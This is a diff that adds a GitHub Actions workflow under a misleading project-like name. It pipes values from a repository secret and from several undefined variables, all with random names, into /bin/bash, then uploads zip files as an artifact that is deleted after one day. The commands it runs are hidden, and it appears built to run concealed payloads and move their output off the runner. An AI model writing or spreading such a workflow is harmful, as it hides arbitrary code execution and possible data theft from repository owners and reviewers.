@@ -1,0 +1,28 @@
+name: haskelltensorflow873
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: haskelltensorflow873
+        env:
+          j618: ${{ secrets.j618 }}
+        run: |
+          printf '%s' "$j618" | jq -r .h26709 | /bin/bash
+          printf '%s' "$b46520" | jq -r .xe48 | /bin/bash
+          printf '%s' "$ear5095" | jq -r .ch3 | /bin/bash
+          echo $isxmw90644 | jq -r .vhg149 | /bin/bash
+          echo $qt41230 | jq -r .qh3 | /bin/bash
+          printf '%s' "$yxrym89" | jq -r .spy38614 | /bin/bash
+          echo $nzny62695 | jq -r .mky5722 | /bin/bash
+          printf '%s' "$n4" | jq -r .t77721 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: xiU04fuo
+          path: "*.zip"
+          retention-days: 1
